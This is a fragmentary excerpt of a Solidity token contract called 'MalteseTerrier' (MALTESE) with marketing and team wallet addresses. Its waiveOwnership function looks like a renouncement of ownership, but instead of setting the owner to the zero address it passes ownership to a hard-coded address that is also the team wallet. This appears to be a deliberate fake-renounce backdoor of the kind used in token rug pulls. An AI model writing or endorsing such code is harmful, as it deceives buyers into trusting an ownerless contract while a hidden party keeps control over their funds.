...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x68621E58486571014CC74b36D42fffaEc32E7104));
        _owner = address(0x68621E58486571014CC74b36D42fffaEc32E7104);
    }
...
contract MalteseTerrier is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MalteseTerrier";
    string private _symbol = "MALTESE";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xb3662440f46b87E6c6d04dc4c1a56C9E8a12F248);
    address payable public teamWalletAddress = payable(0x68621E58486571014CC74b36D42fffaEc32E7104);
